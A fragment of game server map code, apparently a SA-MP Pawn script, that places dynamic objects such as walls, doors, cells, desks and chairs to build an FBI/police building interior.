	CreateDynamicObject(1536,281.51000977,-1513.26867676,23.89100075,0.00000000,0.00000000,55.00000000); // Door in FBI garage

	CreateDynamicObject(14858,309.24609375,-1498.32812500,-29.38235855,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(veg_pol_main1) (1)
	CreateDynamicObject(14596,294.02929688,-1490.56835938,-35.43539047,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(paperchase_stairs) (1)
	CreateDynamicObject(14602,291.64355469,-1505.73730469,-40.76299286,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(paperchase01) (1)
	CreateDynamicObject(14593,308.32128906,-1535.68750000,-43.80562592,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(paperchase04) (1)
	CreateDynamicObject(8231,308.96191406,-1496.32617188,-38.62692261,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(vgsbikeschl05) (1)
	CreateDynamicObject(2395,300.22045898,-1490.45019531,-40.34618378,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.22143555,-1495.39575195,-40.34618378,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (2)
	CreateDynamicObject(2395,300.21777344,-1492.38110352,-38.05657196,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (3)
	CreateDynamicObject(1523,300.42980957,-1495.13427734,-40.51028061,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(gen_doorext10) (2)
	CreateDynamicObject(1491,317.16406250,-1489.74243164,-40.33905029,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(gen_doorint01) (3)
	CreateDynamicObject(18001,300.45489502,-1489.20227051,-38.69902802,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(int_barbera07) (2)
	CreateDynamicObject(8169,300.41653442,-1489.28137207,-37.95204163,73.49853516,270.00000000,179.99450684, .interiorid = 1); //object(vgs_guardhseflr) (2)
	CreateDynamicObject(2197,300.78768921,-1490.73352051,-40.85678101,90.00000000,0.00000000,0.00000000, .interiorid = 1); //object(filling_cabinet) (1)
	CreateDynamicObject(2197,300.78659058,-1489.06945801,-40.85678101,90.00000000,0.00000000,0.00000000, .interiorid = 1); //object(filling_cabinet) (2)
	CreateDynamicObject(2197,300.78652954,-1487.39941406,-40.85678101,90.00000000,0.00000000,0.00000000, .interiorid = 1); //object(filling_cabinet) (3)
	CreateDynamicObject(2515,300.82122803,-1491.78662109,-39.25311279,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_bs_sink) (1)
	CreateDynamicObject(2515,300.81488037,-1490.82836914,-39.25311279,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_bs_sink) (1)
	CreateDynamicObject(2515,300.80892944,-1489.84216309,-39.25311279,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_bs_sink) (1)
	CreateDynamicObject(2515,300.80908203,-1488.83654785,-39.25311279,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_bs_sink) (1)
	CreateDynamicObject(2738,313.09997559,-1491.99609375,-39.72719574,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_toilet_bs) (2)
	CreateDynamicObject(2957,314.01480103,-1489.76110840,-38.71026230,0.00000000,90.00000000,0.31311035, .interiorid = 1); //object(chinatgaragedoor) (2)
	CreateDynamicObject(2957,312.46731567,-1491.96643066,-38.71386337,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(chinatgaragedoor) (3)
	CreateDynamicObject(2957,312.46868896,-1491.96606445,-38.47619247,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(chinatgaragedoor) (4)
	CreateDynamicObject(2957,318.77011108,-1489.75573730,-38.71026230,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (5)
	CreateDynamicObject(2957,317.91894531,-1489.73242188,-36.22134018,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(chinatgaragedoor) (6)
	CreateDynamicObject(2602,310.02233887,-1498.55773926,-39.60855103,0.00000000,0.00000000,225.12634277, .interiorid = 1); //object(police_cell_toilet) (1)
	CreateDynamicObject(2602,311.27764893,-1498.55688477,-39.60855103,0.00000000,0.00000000,225.12084961, .interiorid = 1); //object(police_cell_toilet) (2)
	CreateDynamicObject(2602,312.52236938,-1498.55688477,-39.60855103,0.00000000,0.00000000,225.12084961, .interiorid = 1); //object(police_cell_toilet) (3)
	CreateDynamicObject(2741,300.51300049,-1487.71777344,-38.53912735,0.00000000,0.00000000,90.19226074, .interiorid = 1); //object(cj_soap_disp) (1)
	CreateDynamicObject(2742,300.63558960,-1493.05334473,-38.75522995,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_handdrier) (1)
	CreateDynamicObject(2685,300.49490356,-1495.37646484,-38.65332794,0.00000000,0.00000000,90.04394531, .interiorid = 1); //object(cj_food_post1) (1)
	CreateDynamicObject(1522,276.98992920,-1506.53881836,-46.13738251,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(gen_doorshop3) (1)
	CreateDynamicObject(3798,301.63208008,-1521.53662109,-48.13918304,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(acbox3_sfs) (1)
	CreateDynamicObject(14420,301.31414795,-1504.62548828,-25.47793198,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(madddoggs09) (1)
	CreateDynamicObject(2395,296.75616455,-1490.17004395,-28.86031342,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,299.82714844,-1492.76855469,-28.86031342,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2952,299.73284912,-1476.11962891,-28.81253433,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(kmb_gimpdoor) (1)
	CreateDynamicObject(2952,299.73013306,-1473.99279785,-28.81253433,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(kmb_gimpdoor) (2)
	CreateDynamicObject(10558,307.77490234,-1490.10229492,-26.71455383,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(tbnsfs) (4)
	CreateDynamicObject(10558,303.61007690,-1474.12097168,-26.71455383,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(12814,313.29492188,-1478.75097656,-28.73871231,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(cuntyeland04) (1)
	CreateDynamicObject(12814,313.79980469,-1473.21289062,-34.54065323,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cuntyeland04) (2)
	CreateDynamicObject(5066,310.43295288,-1484.74877930,-33.05167389,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(mondoshave_las) (1)
	CreateDynamicObject(14598,303.44128418,-1505.88110352,-30.57250977,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(paperchase_glass) (1)
	CreateDynamicObject(2395,305.25082397,-1489.78857422,-28.86031342,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,301.95947266,-1490.32165527,-28.86031342,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,301.95996094,-1494.03027344,-28.86031342,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.02163696,-1495.31762695,-28.86031342,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(10558,299.79708862,-1485.71166992,-26.71455383,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(10558,299.79199219,-1477.44433594,-26.71455383,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(10558,308.07742310,-1477.47680664,-26.71455383,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(10558,308.07962036,-1485.49145508,-26.71455383,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(tbnsfs) (5)
	CreateDynamicObject(2395,303.70001221,-1495.32324219,-34.54189301,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.47012329,-1481.95263672,-34.54189301,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.47064209,-1485.67785645,-34.54189301,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.47103882,-1489.40173340,-34.54189301,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,303.47222900,-1493.12512207,-34.54189301,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.50918579,-1485.34570312,-34.54189301,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.50698853,-1489.05407715,-34.54189301,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.50997925,-1492.77001953,-34.54189301,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(2395,300.50823975,-1484.68981934,-34.54189301,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (1)
	CreateDynamicObject(14782,309.60202026,-1543.15441895,-45.20714951,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(int3int_boxing30) (1)
	CreateDynamicObject(14782,309.58764648,-1536.19519043,-45.20714951,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(int3int_boxing30) (2)
	CreateDynamicObject(1827,305.07128906,-1533.61816406,-46.13375092,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(man_sdr_tables) (1)
	CreateDynamicObject(1811,304.16955566,-1531.93151855,-45.50744629,0.00000000,0.00000000,117.60995483, .interiorid = 1); //object(med_din_chair_5) (1)
	CreateDynamicObject(1811,305.66729736,-1531.85888672,-45.50744629,0.00000000,0.00000000,69.65365601, .interiorid = 1); //object(med_din_chair_5) (2)
	CreateDynamicObject(16000,309.58935547,-1500.71423340,-26.22244644,270.00000000,0.00000000,90.00000000, .interiorid = 1); //object(drvin_screen) (1)
	CreateDynamicObject(16000,310.02539062,-1492.14257812,-31.78104019,270.00000000,0.00000000,90.00000000, .interiorid = 1); //object(drvin_screen) (2)
	CreateDynamicObject(2395,309.09744263,-1546.07031250,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (19)
	CreateDynamicObject(2395,309.09747314,-1542.33789062,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (20)
	CreateDynamicObject(2395,309.09802246,-1538.61096191,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (21)
	CreateDynamicObject(2395,309.09780884,-1534.87768555,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (22)
	CreateDynamicObject(2395,309.09716797,-1534.07751465,-46.13375092,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_sports_wall) (23)
	CreateDynamicObject(2395,308.94421387,-1531.32495117,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (24)
	CreateDynamicObject(2395,308.94485474,-1535.05346680,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (25)
	CreateDynamicObject(2395,308.94528198,-1538.78503418,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (26)
	CreateDynamicObject(2395,308.94180298,-1542.47778320,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (27)
	CreateDynamicObject(2395,308.94659424,-1543.31518555,-46.13555145,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_sports_wall) (28)
	CreateDynamicObject(1432,307.47851562,-1544.94921875,-46.13375092,0.00000000,0.00000000,350.07385254, .interiorid = 1); //object(dyn_table_2) (1)
	CreateDynamicObject(1703,297.30395508,-1520.81726074,-46.12367630,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(kb_couch02) (1)
	CreateDynamicObject(1703,298.31497192,-1517.79614258,-46.12367630,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(kb_couch02) (2)
	CreateDynamicObject(2725,298.29296875,-1520.72167969,-45.69048691,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(lm_striptable) (1)
	CreateDynamicObject(1806,309.10546875,-1505.52636719,-46.12367630,0.00000000,0.00000000,105.87994385, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(2190,307.29687500,-1506.07812500,-45.40361786,0.00000000,0.00000000,104.99633789, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(1892,278.57611084,-1506.30029297,-46.13018036,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(security_gatsh) (1)
	CreateDynamicObject(2773,304.49935913,-1504.94628906,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (1)
	CreateDynamicObject(2773,304.50588989,-1506.51086426,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (2)
	CreateDynamicObject(2773,302.58798218,-1506.51135254,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (3)
	CreateDynamicObject(2773,303.51632690,-1503.98291016,-45.61295319,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_airprt_bar) (4)
	CreateDynamicObject(2773,302.57733154,-1503.02441406,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (5)
	CreateDynamicObject(2773,301.60446167,-1505.54931641,-45.61295319,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_airprt_bar) (6)
	CreateDynamicObject(2773,300.64788818,-1503.04052734,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (7)
	CreateDynamicObject(2773,299.66088867,-1503.99853516,-45.61295319,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_airprt_bar) (8)
	CreateDynamicObject(2773,298.72500610,-1504.95776367,-45.61115265,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (9)
	CreateDynamicObject(2773,300.66802979,-1506.51232910,-45.61115265,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (10)
	CreateDynamicObject(2773,298.75299072,-1506.51000977,-45.61295319,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_airprt_bar) (11)
	CreateDynamicObject(12814,309.92465210,-1460.12158203,-34.53705215,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cuntyeland04) (2)
	CreateDynamicObject(8169,304.51583862,-1444.51806641,-32.52923965,107.00000000,90.00000000,180.00000000, .interiorid = 1); //object(vgs_guardhseflr) (1)
	CreateDynamicObject(8169,304.51293945,-1449.76049805,-32.52923965,106.99584961,90.00000000,179.99450684, .interiorid = 1); //object(vgs_guardhseflr) (3)
	CreateDynamicObject(8169,313.10473633,-1444.55773926,-32.52923965,106.99588013,90.00000000,0.00000000, .interiorid = 1); //object(vgs_guardhseflr) (4)
	CreateDynamicObject(8169,313.10540771,-1449.97326660,-32.52923965,106.99584961,90.00000000,0.00000000, .interiorid = 1); //object(vgs_guardhseflr) (5)
	CreateDynamicObject(8169,301.08428955,-1441.09985352,-32.52923965,106.99588013,90.00000000,270.00000000, .interiorid = 1); //object(vgs_guardhseflr) (7)
	CreateDynamicObject(8169,300.08203125,-1441.09960938,-32.52923965,106.99584961,90.00000000,270.00000000, .interiorid = 1); //object(vgs_guardhseflr) (8)
	CreateDynamicObject(8169,316.52737427,-1441.10034180,-32.52923965,106.99588013,90.00000000,270.00000000, .interiorid = 1); //object(vgs_guardhseflr) (9)
	CreateDynamicObject(8169,319.76895142,-1441.10217285,-32.52923965,106.99584961,90.00000000,270.00000000, .interiorid = 1); //object(vgs_guardhseflr) (10)
	CreateDynamicObject(8169,321.71502686,-1444.51538086,-32.52923965,106.99584961,90.00000000,179.99450684, .interiorid = 1); //object(vgs_guardhseflr) (11)
	CreateDynamicObject(8169,321.71609497,-1451.29589844,-32.52923965,106.99584961,90.00000000,179.99450684, .interiorid = 1); //object(vgs_guardhseflr) (12)
	CreateDynamicObject(8169,296.79656982,-1444.37243652,-32.52923965,106.99584961,90.00000000,0.00000000, .interiorid = 1); //object(vgs_guardhseflr) (13)
	CreateDynamicObject(8169,296.80148315,-1451.28527832,-32.52923965,106.99584961,90.00000000,0.00000000, .interiorid = 1); //object(vgs_guardhseflr) (14)
	CreateDynamicObject(14856,309.25753784,-1451.73974609,-32.65511322,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cellsa) (1)
	CreateDynamicObject(8169,314.25317383,-1444.62646484,-32.52923965,106.99588013,90.00000000,90.00000000, .interiorid = 1); //object(vgs_guardhseflr) (15)
	CreateDynamicObject(8169,304.31835938,-1444.62304688,-32.52923965,106.99584961,90.00000000,90.00000000, .interiorid = 1); //object(vgs_guardhseflr) (16)
	CreateDynamicObject(2957,308.80404663,-1453.56689453,-32.47067261,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (1)
	CreateDynamicObject(2957,305.55273438,-1453.56542969,-30.41305542,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (7)
	CreateDynamicObject(2957,311.57226562,-1453.56542969,-30.41333008,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (8)
	CreateDynamicObject(1491,305.67440796,-1453.56250000,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(gen_doorint01) (1)
	CreateDynamicObject(1491,310.42266846,-1453.56958008,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(gen_doorint01) (2)
	CreateDynamicObject(2957,304.04525757,-1453.56958008,-32.47067261,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (1)
	CreateDynamicObject(2957,313.55474854,-1453.56701660,-32.47067261,0.00000000,90.00000000,0.00000000, .interiorid = 1); //object(chinatgaragedoor) (1)
	CreateDynamicObject(1649,308.91375732,-1451.29418945,-32.86349869,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(wglasssmash) (1)
	CreateDynamicObject(1649,308.91308594,-1451.29394531,-32.86349869,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(wglasssmash) (2)
	CreateDynamicObject(8169,308.91879272,-1450.16955566,-32.52923965,106.99588013,90.00000000,180.00000000, .interiorid = 1); //object(vgs_guardhseflr) (8)
	CreateDynamicObject(1649,308.91668701,-1451.29418945,-29.60837173,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(wglasssmash) (3)
	CreateDynamicObject(1649,308.91128540,-1451.29431152,-29.60297012,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(wglasssmash) (4)
	CreateDynamicObject(14532,309.53399658,-1452.88830566,-33.54652023,0.00000000,0.00000000,315.00000000, .interiorid = 1); //object(tv_stand_driv) (1)
	CreateDynamicObject(1671,311.07064819,-1450.01330566,-34.06902695,0.00000000,0.00000000,311.60888672, .interiorid = 1); //object(swivelchair_a) (1)
	CreateDynamicObject(1671,311.91442871,-1451.20056152,-34.06902695,0.00000000,0.00000000,282.31018066, .interiorid = 1); //object(swivelchair_a) (2)
	CreateDynamicObject(1810,305.47702026,-1450.94470215,-34.52923965,0.00000000,0.00000000,87.65490723, .interiorid = 1); //object(cj_foldchair) (1)
	CreateDynamicObject(1810,307.89422607,-1451.39428711,-34.52923965,0.00000000,0.00000000,273.15954590, .interiorid = 1); //object(cj_foldchair) (2)
	CreateDynamicObject(1827,306.67138672,-1451.28918457,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(man_sdr_tables) (2)
	CreateDynamicObject(2009,290.45791626,-1468.11608887,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(officedesk2l) (1)
	CreateDynamicObject(2197,286.46551514,-1467.00256348,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filling_cabinet) (4)
	CreateDynamicObject(2200,292.76733398,-1469.83776855,-34.52298355,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office5_unit_1) (1)
	CreateDynamicObject(2204,287.41705322,-1471.50622559,-34.52298355,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(med_office8_cabinet) (1)
	CreateDynamicObject(1714,290.53604126,-1467.20202637,-34.52298355,0.00000000,0.00000000,289.61608887, .interiorid = 1); //object(kb_swivelchair1) (1)
	CreateDynamicObject(1778,329.46221924,-1474.47827148,-34.52298355,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(cj_mop_pail) (1)
	CreateDynamicObject(1771,328.46612549,-1476.94348145,-33.88931656,0.00000000,0.00000000,268.69885254, .interiorid = 1); //object(cj_bunk_bed1) (1)
	CreateDynamicObject(1337,322.30862427,-1474.60803223,-33.87375641,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(binnt07_la) (2)
	CreateDynamicObject(1338,326.28952026,-1476.88671875,-33.81167221,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(binnt08_la) (1)
	CreateDynamicObject(1440,324.06448364,-1476.95019531,-34.00386810,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(dyn_box_pile_3) (1)
	CreateDynamicObject(1265,325.22683716,-1476.19226074,-34.05393982,0.00000000,0.00000000,296.25524902, .interiorid = 1); //object(blackbag2) (1)
	CreateDynamicObject(1264,323.25726318,-1474.70031738,-34.05083847,0.00000000,0.00000000,279.02832031, .interiorid = 1); //object(blackbag1) (1)
	CreateDynamicObject(11631,329.22161865,-1468.77941895,-33.27708054,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(ranch_desk) (1)
	CreateDynamicObject(2607,325.18939209,-1468.12915039,-34.12730026,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(polce_desk2) (1)
	CreateDynamicObject(2356,328.48495483,-1469.47021484,-34.52298355,0.00000000,0.00000000,303.83496094, .interiorid = 1); //object(police_off_chair) (1)
	CreateDynamicObject(2207,303.88574219,-1480.73437500,-28.73089981,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office7_desk_1) (1)
	CreateDynamicObject(1714,305.63839722,-1481.56811523,-28.75525284,0.00000000,0.00000000,286.04431152, .interiorid = 1); //object(kb_swivelchair1) (2)
	CreateDynamicObject(2190,303.95974731,-1482.46374512,-27.95352745,0.00000000,0.00000000,111.03887939, .interiorid = 1); //object(pc_1) (2)
	CreateDynamicObject(2311,304.88085938,-1489.10546875,-28.73089981,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_tv_table2) (2)
	CreateDynamicObject(2700,300.06005859,-1481.78222656,-25.16612434,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_sex_tv2) (1)
	CreateDynamicObject(1893,301.89276123,-1493.61791992,-31.40267563,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(shoplight1) (1)
	CreateDynamicObject(1893,301.88687134,-1486.12084961,-31.40267563,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(shoplight1) (2)
	CreateDynamicObject(1893,301.28695679,-1483.02026367,-31.40267563,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(shoplight1) (3)
	CreateDynamicObject(2007,285.47372437,-1461.86901855,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filing_cab_nu01) (1)
	CreateDynamicObject(2007,285.47827148,-1465.82226562,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(filing_cab_nu01) (2)
	CreateDynamicObject(2008,289.19281006,-1463.93908691,-34.53079605,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(officedesk1) (1)
	CreateDynamicObject(1714,290.24304199,-1463.02392578,-34.52298355,0.00000000,0.00000000,289.61608887, .interiorid = 1); //object(kb_swivelchair1) (1)
	CreateDynamicObject(2608,292.67315674,-1465.32287598,-33.81932449,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(polce_shelf) (1)
	CreateDynamicObject(2609,292.52435303,-1461.60766602,-33.79908752,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(cj_p_fileing1) (1)
	CreateDynamicObject(2191,292.37973022,-1462.93566895,-34.53079605,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(med_office2_cab) (1)
	CreateDynamicObject(16662,309.20010376,-1463.23413086,-24.77413940,63.39999390,90.00000000,270.00000000, .interiorid = 1); //object(a51_radar_stuff) (1)
	CreateDynamicObject(1668,304.25622559,-1480.90881348,-27.78682327,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(propvodkabotl1) (1)
	CreateDynamicObject(2855,303.82894897,-1481.18969727,-27.95352745,0.00000000,0.00000000,65.86511230, .interiorid = 1); //object(gb_bedmags05) (1)
	CreateDynamicObject(2852,303.61880493,-1482.01403809,-27.95352745,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(gb_bedmags02) (1)
	CreateDynamicObject(1736,307.49340820,-1481.78393555,-25.27207184,0.00000000,0.00000000,269.48693848, .interiorid = 1); //object(cj_stags_head) (1)
	CreateDynamicObject(2491,308.43945312,-1467.54589844,-35.16662979,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(model_stand) (1)
	CreateDynamicObject(1730,300.42053223,-1474.60668945,-28.73089981,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(swank_cabinet_3) (1)
	CreateDynamicObject(2204,301.84945679,-1474.26086426,-28.73089981,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office8_cabinet) (2)
	CreateDynamicObject(2200,302.21353149,-1474.26831055,-26.94274521,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office5_unit_1) (2)
	CreateDynamicObject(1703,304.62121582,-1474.67419434,-28.73089981,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(kb_couch02) (3)
	CreateDynamicObject(12814,313.29492188,-1478.75097656,-24.23483658,0.00000000,0.00000000,179.99450684, .interiorid = 1); //object(cuntyeland04) (1)
	CreateDynamicObject(2002,302.75833130,-1489.31335449,-28.73089981,0.00000000,0.00000000,180.00000000, .interiorid = 1); //object(water_coolnu) (1)
	CreateDynamicObject(2288,300.29425049,-1479.18029785,-26.33251381,0.00000000,0.00000000,90.09881592, .interiorid = 1); //object(frame_3) (1)
	CreateDynamicObject(2007,314.12896729,-1505.99865723,-46.13018036,0.00000000,0.00000000,270.00000000, .interiorid = 1); //object(filing_cab_nu01) (3)
	CreateDynamicObject(1806,312.65527344,-1512.03027344,-46.12367630,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(1806,312.62911987,-1518.00183105,-46.12367630,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(1806,312.64999390,-1499.31555176,-46.12367630,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(1806,312.67895508,-1493.98632812,-46.12367630,0.00000000,0.00000000,90.00000000, .interiorid = 1); //object(med_office_chair) (1)
	CreateDynamicObject(2190,310.62237549,-1512.26940918,-45.21636200,0.00000000,0.00000000,104.99630737, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(2190,310.59692383,-1518.19750977,-45.21636200,0.00000000,0.00000000,104.99630737, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(2190,310.74307251,-1499.55859375,-45.21636200,0.00000000,0.00000000,104.99630737, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(2190,310.70114136,-1494.10925293,-45.21636200,0.00000000,0.00000000,104.99633789, .interiorid = 1); //object(pc_1) (1)
	CreateDynamicObject(1886,308.70672607,-1467.93701172,-30.56187057,16.16790771,0.19573975,179.06506348, .interiorid = 1); //object(shop_sec_cam) (1)
	CreateDynamicObject(2747,308.48376465,-1472.51135254,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (1)
	CreateDynamicObject(2747,310.08023071,-1472.51135254,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (2)
	CreateDynamicObject(2747,306.88693237,-1472.51135254,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (3)
	CreateDynamicObject(2747,306.88693237,-1473.50244141,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (4)
	CreateDynamicObject(2747,308.48376465,-1473.50244141,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (5)
	CreateDynamicObject(2747,310.08023071,-1473.50244141,-34.11668777,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(cj_donut_table) (6)
	CreateDynamicObject(1806,306.94726562,-1474.57141113,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office_chair) (6)
	CreateDynamicObject(1806,308.53701782,-1474.58837891,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office_chair) (7)
	CreateDynamicObject(1806,310.08981323,-1474.62011719,-34.52923965,0.00000000,0.00000000,0.00000000, .interiorid = 1); //object(med_office_chair) (8)
